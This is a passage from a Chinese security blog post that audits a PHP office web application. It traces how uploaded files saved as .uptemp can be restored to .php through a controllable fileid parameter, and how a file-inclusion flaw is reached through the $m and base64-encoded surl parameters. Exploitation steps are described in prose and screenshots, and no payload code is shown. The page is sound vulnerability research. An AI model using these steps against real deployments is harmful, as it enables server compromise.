+<p>主要是对上传文件的限制，使得他按照要求进行上传，里面调用了c函数，跳转到C函数中发现包含了<code>uploadchajian.php</code></p>
+<p><img src="https://pic.imgdb.cn/item/673b06a0d29ded1a8c80f1f7.png" alt=""></p>
+<p>回到原来的代码中发现第49行调用了up函数，跳转查看</p>
+<p><img src="https://pic.imgdb.cn/item/673b12a0d29ded1a8c8f6af3.png" alt=""></p>
+<p><code>issavefile()</code>方法是用来进行后缀判断的</p>
+<p><img src="https://pic.imgdb.cn/item/673b14e6d29ded1a8c92087f.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/673b14a3d29ded1a8c91b1b2.png" alt=""></p>
+<p>白名单绕过，如果不在的话调用<code>filesave</code>函数</p>
+<p><img src="https://pic.imgdb.cn/item/673b15c5d29ded1a8c92f750.png" alt=""></p>
+<p>这段是读取我们上传的文件内容并保存为base64编码格式，然后将代码保存为uptemp文件，最后进行删除，</p>
+<p><img src="https://pic.imgdb.cn/item/673b16bdd29ded1a8c941bf8.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/673b1708d29ded1a8c947201.png" alt=""></p>
+<p>回到 <code>upfileAciton()</code> 方法中， <code>$upses</code> 接收 <code>up()</code> 方法返回的数据并将数据通过 <code>downChajian.php</code> 中<code>uploadback()</code> 方法备份到数据库，并以json形式返回</p>
+<p><img src="https://pic.imgdb.cn/item/673b179ad29ded1a8c953457.png" alt=""></p>
+<p>我们发现这里上传到的.php文件后缀会被替换为 .uptemp 后缀的文件，并返回了上传路径</p>
+<p>但是我们在进行关键函数的检索的时候发现了一个可以解密base64的地方，并且可以通过控制id来还原<code>.uptemp</code>后缀文件为之前上传的后缀</p>
+<p><img src="https://pic.imgdb.cn/item/673b1a42d29ded1a8c988212.png" alt=""></p>
+<p>从这一段可以看出是上面上传处理的一个反向操作，并且通过<code>fileid</code>来控制</p>
+<p><img src="https://pic.imgdb.cn/item/673b1a8bd29ded1a8c98daf3.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/673dba0fd29ded1a8ce74350.png" alt=""></p>
+<p>联系上面是fileid参数来控制上传的文件使其还原</p>
+<p>所以我们可以通过更改fileid来控制</p>
+<h3>渗透测试</h3>
+<p>将fileid替换为我们上传的文件的id</p>
+<p><img src="https://pic.imgdb.cn/item/673b1b16d29ded1a8c99869b.png" alt=""></p>
+<p>发现之前的.uptemp确实是可以被替换为.php文件后缀</p>
+<p><img src="https://pic.imgdb.cn/item/673b1b38d29ded1a8c99b1da.png" alt=""></p>
+<h2>文件包含</h2>
+<p>在<code>include_once</code>的时候发现一个<code>mpathname</code>可控，</p>
+<p><img src="https://pic.imgdb.cn/item/673ca031d29ded1a8cffcf11.png" alt=""></p>
+<p>所以我们尝试跟踪这个发现他在上面被赋值了，就是71行的<code>$tplpaths.$tplname</code>
+下面我们发现<code>tplname</code>的后缀是限制限制死的只能为html</p>
+<p><img src="https://pic.imgdb.cn/item/673ca045d29ded1a8cffdeea.png" alt=""></p>
+<p>我们跟踪另外一个<code>mpathname</code>，他的代码说明是检查<code>$xhrock-&gt;displayfile</code>是否不为空，检查文件是否存在，然后重点关注这个<code>xhrock</code>,回溯到上面的是新建一个实例，然后接着回溯这个返现是可以通过控制<code>$m</code>来控制的</p>
+<p><img src="https://pic.imgdb.cn/item/673ca15dd29ded1a8c00d7b1.png" alt=""></p>
+<p>而这里的$m是通过前端传入的</p>
+<p><img src="https://pic.imgdb.cn/item/673ca241d29ded1a8c01a37e.png" alt=""></p>
+<p>但这里想要进入34行的if判断必须存在 $actfile 文件,而这里的 $actfile 变量是通过代码30行进行处理的。我们跟进 strformat() 函数</p>
+<p><img src="https://pic.imgdb.cn/item/673ca299d29ded1a8c01ec8a.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/673ca6e5d29ded1a8c059644.png" alt=""></p>
+<p>这两个的大概内容是找到对应的php文件，而上述代码30行的<code>$m</code>是可控的,所以回到<code>xhrock</code>看<code>displayfile</code>可控的地方</p>
+<p><img src="https://pic.imgdb.cn/item/673ca7c2d29ded1a8c077d5b.png" alt=""></p>
+<p>找到这个</p>
+<p><code>indexAction.php</code>的 <code>getshtmlAction</code> 函数中的 <code>displayfile</code> 变
+量是通过 <code>$file</code> 进行赋值的，而 <code>$file</code> 中的 <code>$surl</code>参数是前端可控的，所以这里可以包含任意的php后缀文件。
+（记得base64编码）</p>
+<p>而<code>View.php</code>中这里我们可以控制<code>$m</code>来调用<code>indexAction.php</code>文件并且实例化文件中的<code>indexClassAction</code> 类，并且可以任意调用该类下的方法，也就是可以调用 <code>indexClassAction</code> 类下的<code>getshtmlAction</code> 方法</p>
+<p><img src="https://pic.imgdb.cn/item/673ca9acd29ded1a8c0b53f6.png" alt=""></p>
+<h3>渗透测试</h3>
+<p><img src="https://pic.imgdb.cn/item/673ca9dbd29ded1a8c0b8fc0.png" alt=""></p>
+<h2></h2>
+
+    </article>
+  </main>
+</div>
+
+<footer class="site-footer">
+  ✦ 旅店已开放 <b id="sfDays">…</b> 天<span class="star">·</span>愿终有一天能与你重要的人重逢
+</footer>
+<script>
+(function () {
+  var el = document.getElementById('sfDays');
+  if (!el) return;
+  var open = Math.max(1, Math.ceil((Date.now() - new Date('2023-04-12T00:00:00+08:00').getTime()) / 864e5));
+  el.textContent = open.toLocaleString('en-US');
+})();
+</script>
+<div class="mp-root">
+  <button class="mp-disc" id="mpDisc" type="button" aria-label="音乐播放器" title="音乐播放器"></button>
+  <div class="mp-panel" id="mpPanel">
+    <div class="mp-head"><span class="mp-title" id="mpTitle">…</span><span class="mp-artist" id="mpArtist"></span></div>
+    <div class="mp-progress">
+      <span class="mp-bar" id="mpBar"><i id="mpFill"></i></span>
+      <span class="mp-time" id="mpTime">0:00 / 0:00</span>
+    </div>
+    <div class="mp-ctrls">
+      <button type="button" id="mpPrev" title="上一首"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 6h2v12H7zM20 6v12L9.5 12z"/></svg></button>
+      <button type="button" class="mp-playbtn" id="mpPlay" title="播放/暂停"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5.5v13l11-6.5z"/></svg></button>
+      <button type="button" id="mpNext" title="下一首"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M15 6h2v12h-2zM4 6v12l10.5-6z"/></svg></button>
+    </div>
+    <ul class="mp-playlist" id="mpListEl"></ul>
+  </div>
+</div>
+<audio id="mpAudio" preload="none"></audio>
+<script>
+(function () {
+  var TR = [{"title":"野火 Wildfire","artist":"HOYO-MiX","url":"https://music.163.com/song/media/outer/url?id=2045806409.mp3"},{"title":"疾如猛火 Rapid as Wildfires","artist":"陈致逸/HOYO-MiX","url":"https://music.163.com/song/media/outer/url?id=1492283139.mp3"},{"title":"Moon Halo","artist":"HOYO-MiX","url":"https://music.163.com/song/media/outer/url?id=1859652717.mp3"},{"title":"Nightglow (Instrumental)","artist":"HOYO-MiX","url":"https://music.163.com/song/media/outer/url?id=1334673828.mp3"},{"title":"皎洁的笑颜 Moonlike Smile","artist":"陈致逸/HOYO-MiX","url":"https://music.163.com/song/media/outer/url?id=1833805540.mp3"},{"title":"坠叶与晚星 Falling Leaves and Even-Stars","artist":"HOYO-MiX","url":"https://music.163.com/song/media/outer/url?id=3437729518.mp3"}];
+  if (!TR.length) return;
+  var audio = document.getElementById('mpAudio');
+  var disc = document.getElementById('mpDisc');
+  var panel = document.getElementById('mpPanel');
+  var titleEl = document.getElementById('mpTitle');
+  var artistEl = document.getElementById('mpArtist');
+  var fill = document.getElementById('mpFill');
+  var timeEl = document.getElementById('mpTime');
+  var bar = document.getElementById('mpBar');
+  var playBtn = document.getElementById('mpPlay');
+  var listEl = document.getElementById('mpListEl');
+  var cur = 0, errs = 0;
+
+  function fmt(s) {
+    if (!isFinite(s)) return '0:00';
+    s = Math.max(0, Math.round(s));
+    return Math.floor(s / 60) + ':' + String(s % 60).padStart(2, '0');
+  }
+  function renderList() {
+    listEl.innerHTML = TR.map(function (t, i) {
+      return '<li class="' + (i === cur ? 'on' : '') + '" data-i="' + i + '"><span class="idx">' + (i + 1) + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + t.title + (t.artist ? ' · ' + t.artist : '') + '</span></li>';
+    }).join('');
+  }
+  function setPlayIcon(on) {
+    playBtn.innerHTML = on
+      ? '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 5h3.5v14H7zM13.5 5H17v14h-3.5z"/></svg>'
+      : '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5.5v13l11-6.5z"/></svg>';
+    disc.classList.toggle('playing', on);
+  }
+  function load(i, autoplay) {
+    cur = ((i % TR.length) + TR.length) % TR.length;
+    var t = TR[cur];
+    audio.src = t.url;
+    titleEl.textContent = t.title;
+    artistEl.textContent = t.artist || '';
+    fill.style.width = '0';
+    timeEl.textContent = '0:00 / 0:00';
+    renderList();
+    if (autoplay) audio.play().catch(function () {});
+  }
+  function next(auto) { errs = auto ? errs : 0; load(cur + 1, playing || !!auto); }
+  function prev() { load(cur - 1, playing); }
+
+  disc.addEventListener('click', function () { panel.classList.toggle('open'); });
+  playBtn.addEventListener('click', function () {
+    if (!audio.src) { load(cur, true); return; }
+    if (audio.paused) audio.play().catch(function () {}); else audio.pause();
+  });
+  document.getElementById('mpNext').addEventListener('click', function () { next(false); });
+  document.getElementById('mpPrev').addEventListener('click', prev);
+  audio.addEventListener('play', function () { setPlayIcon(true); playing = true; });
+  audio.addEventListener('pause', function () { setPlayIcon(false); playing = false; });
+  audio.addEventListener('ended', function () { next(true); });
+  audio.addEventListener('error', function () {
+    errs++;
+    if (errs >= TR.length) { titleEl.textContent = '歌单加载失败'; setPlayIcon(false); return; }
+    next(true);
+  });
+  audio.addEventListener('playing', function () { errs = 0; });
+  audio.addEventListener('timeupdate', function () {
+    var d = audio.duration;
+    fill.style.width = (d ? (audio.currentTime / d) * 100 : 0) + '%';
+    timeEl.textContent = fmt(audio.currentTime) + ' / ' + fmt(d);
+  });
+  bar.addEventListener('click', function (e) {
+    var r = bar.getBoundingClientRect();
+    if (isFinite(audio.duration)) audio.currentTime = ((e.clientX - r.left) / r.width) * audio.duration;
+  });
+  listEl.addEventListener('click', function (e) {
+    var li = e.target.closest('li[data-i]');
+    if (!li) return;
+    playing = true;
+    load(parseInt(li.dataset.i, 10), true);
+  });
+
+  load(0, false);
+})();
+</script>
+
+<script>
+(function () {
+  // 侧栏「最近」列表
+  var data = {"recent":[{"t":"内网渗透","u":"/article/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","d":"2026-08-26","w":18366,"c":"/covers/0208.jpg","cur":false},{"t":"钓鱼","u":"/article/%E9%92%93%E9%B1%BC/","d":"2026-08-26","w":986,"c":"/covers/0640.jpg","cur":false},{"t":"AI agent","u":"/article/agent/","d":"2026-07-07","w":1919,"c":"/covers/0035.jpg","cur":false},{"t":"vpn develop","u":"/article/vpn_develop/","d":"2026-02-15","w":4053,"c":"/covers/0002.jpg","cur":false},{"t":"llm prompt attack","u":"/article/llm_prompt_attack/","d":"2026-02-12","w":11607,"c":"/covers/0098.jpg","cur":false}]};
+  var list = document.getElementById('list');
+  var me = location.pathname;
+  function render() {
+    var rows = data.recent || [];
+    if (!rows.length) { list.innerHTML = '<div class="empty">还没有文章</div>'; return; }
+    list.innerHTML = rows.map(function (a) {
+      return '<a href="' + a.u + '" title="' + a.t + '"' + (a.cur ? ' class="cur"' : '') + '>' +
+        '<span class="thumb">' + (a.c ? '<img src="' + a.c + '" alt="" loading="lazy" onerror="this.remove()">' : '') + '</span>' +
+        '<span class="txt"><span class="t">' + a.t + '</span><span class="m">' +
+        (a.d ? a.d + ' · ' : '') + a.w.toLocaleString('en-US') + ' 字</span></span></a>';
+    }).join('');
+  }
+  render();
+  void me;
+
+  // 复制当前链接
+  var cp = document.querySelector('.share-copy');
+  if (cp) {
+    cp.dataset.url = location.href;
+    cp.addEventListener('click', function () {
+      var done = function () {
+        var old = cp.getAttribute('title');
+        cp.setAttribute('title', '已复制');
+        setTimeout(function () { cp.setAttribute('title', old); }, 1600);
+      };
+      if (navigator.clipboard) navigator.clipboard.writeText(location.href).then(done, done);
+      else done();
+    });
+  }
+
+  // 正文外链新窗口 + 图片兜底
+  document.querySelectorAll('.sao-article a[href^="http"]').forEach(function (a) {
+    a.target = '_blank'; a.rel = 'noopener';
+  });
+  document.querySelectorAll('.sao-article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+})();
+</script>
+</body>
+</html>
